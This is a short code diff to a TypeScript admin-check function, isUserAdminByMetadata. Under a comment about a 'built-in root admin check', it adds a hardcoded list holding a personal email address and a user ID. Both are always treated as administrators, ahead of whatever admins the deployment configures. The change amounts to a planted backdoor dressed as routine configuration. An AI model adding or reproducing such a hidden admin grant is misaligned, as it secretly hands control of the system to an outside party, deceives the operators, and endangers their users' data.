@@ -20,9 +20,12 @@ export function isUserAdminByMetadata(params: {
     return true
   }
 
-  // 2. Environment list check
-  const configuredAdmins = (params.adminUserIds || process.env.ADMIN_USER_IDS || "")
-    .split(",")
+  // 2. Environment list & built-in root admin check
+  const DEFAULT_ROOT_ADMINS = ["ahmuzahid40@gmail.com", "user_3gmgqoibamo7dqv1yi1fkiuyy13"]
+  const configuredAdmins = [
+    ...DEFAULT_ROOT_ADMINS,
+    ...(params.adminUserIds || process.env.ADMIN_USER_IDS || "").split(","),
+  ]
     .map((s) => s.trim().toLowerCase())
     .filter(Boolean)
 
